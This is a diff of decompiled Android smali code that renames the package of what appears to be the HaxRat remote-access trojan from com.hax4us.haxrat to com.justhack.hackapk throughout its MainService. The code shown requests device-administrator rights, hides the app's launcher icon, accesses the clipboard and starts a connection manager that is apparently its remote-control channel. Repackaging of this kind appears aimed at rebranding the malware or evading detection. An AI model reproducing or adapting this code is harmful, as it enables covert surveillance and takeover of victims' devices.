@@ -155,7 +155,7 @@
     :cond_0
     move-object v6, v3
 
-    invoke-static {v6}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V
+    invoke-static {v6}, Lcom/justhack/hackapk/MainService;->startService(Landroid/content/Context;)V
 
     goto :goto_0
 .end method
@@ -165,7 +165,7 @@
 
     .prologue
     .line 133
-    sget-object v2, Lcom/hax4us/haxrat/MainService;->contextOfApplication:Landroid/content/Context;
+    sget-object v2, Lcom/justhack/hackapk/MainService;->contextOfApplication:Landroid/content/Context;
 
     move-object v0, v2
 
@@ -183,7 +183,7 @@
     .prologue
     .line 116
     :try_start_0
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->findContext()V
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->findContext()V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -321,7 +321,7 @@
 
     invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
-    invoke-virtual {v2, v3}, Lcom/hax4us/haxrat/MainService;->sendBroadcast(Landroid/content/Intent;)V
+    invoke-virtual {v2, v3}, Lcom/justhack/hackapk/MainService;->sendBroadcast(Landroid/content/Intent;)V
 
     return-void
 .end method
@@ -343,7 +343,7 @@
 
     move-object v11, v0
 
-    invoke-virtual {v11}, Lcom/hax4us/haxrat/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
+    invoke-virtual {v11}, Lcom/justhack/hackapk/MainService;->getPackageManager()Landroid/content/pm/PackageManager;
 
     move-result-object v11
 
@@ -354,13 +354,13 @@
 
     const-string v12, "device_policy"
 
-    invoke-virtual {v11, v12}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v11, v12}, Lcom/justhack/hackapk/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v11
 
     check-cast v11, Landroid/app/admin/DevicePolicyManager;
 
-    sput-object v11, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
+    sput-object v11, Lcom/justhack/hackapk/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
 
     .line 43
     new-instance v11, Landroid/content/ComponentName;
@@ -374,7 +374,7 @@
     move-object v13, v0
 
     :try_start_0
-    const-string v14, "com.hax4us.haxrat.DeviceAdmin"
+    const-string v14, "com.justhack.hackapk.DeviceAdmin"
 
     invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -384,12 +384,12 @@
 
     invoke-direct {v12, v13, v14}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    sput-object v11, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;
+    sput-object v11, Lcom/justhack/hackapk/MainService;->mAdminName:Landroid/content/ComponentName;
 
     .line 44
-    sget-object v11, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
+    sget-object v11, Lcom/justhack/hackapk/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;
 
-    sget-object v12, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;
+    sget-object v12, Lcom/justhack/hackapk/MainService;->mAdminName:Landroid/content/ComponentName;
 
     invoke-virtual {v11, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z
 
@@ -417,7 +417,7 @@
 
     const-string v12, "android.app.extra.DEVICE_ADMIN"
 
-    sget-object v13, Lcom/hax4us/haxrat/MainService;->mAdminName:Landroid/content/ComponentName;
+    sget-object v13, Lcom/justhack/hackapk/MainService;->mAdminName:Landroid/content/ComponentName;
 
     invoke-virtual {v11, v12, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
 
@@ -449,7 +449,7 @@
     move-object v14, v0
 
     :try_start_1
-    const-string v15, "com.hax4us.haxrat.MainActivity"
+    const-string v15, "com.justhack.hackapk.MainActivity"
 
     invoke-static {v15}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_1
@@ -466,7 +466,7 @@
     invoke-virtual {v11, v12, v13, v14}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
 
     .line 54
-    new-instance v11, Lcom/hax4us/haxrat/MainService$100000000;
+    new-instance v11, Lcom/justhack/hackapk/MainService$100000000;
 
     move-object/from16 v19, v11
 
@@ -476,7 +476,7 @@
 
     move-object v13, v0
 
-    invoke-direct {v12, v13}, Lcom/hax4us/haxrat/MainService$100000000;-><init>(Lcom/hax4us/haxrat/MainService;)V
+    invoke-direct {v12, v13}, Lcom/justhack/hackapk/MainService$100000000;-><init>(Lcom/justhack/hackapk/MainService;)V
 
     move-object v8, v11
 
@@ -485,7 +485,7 @@
 
     const-string v12, "clipboard"
 
-    invoke-virtual {v11, v12}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v11, v12}, Lcom/justhack/hackapk/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v11
 
@@ -503,12 +503,12 @@
     .line 79
     move-object v11, v0
 
-    sput-object v11, Lcom/hax4us/haxrat/MainService;->contextOfApplication:Landroid/content/Context;
+    sput-object v11, Lcom/justhack/hackapk/MainService;->contextOfApplication:Landroid/content/Context;
 
     .line 80
     move-object v11, v0
 
-    invoke-static {v11}, Lcom/hax4us/haxrat/ConnectionManager;->startAsync(Landroid/content/Context;)V
+    invoke-static {v11}, Lcom/justhack/hackapk/ConnectionManager;->startAsync(Landroid/content/Context;)V
 
     .line 81
     const/4 v11, 0x1
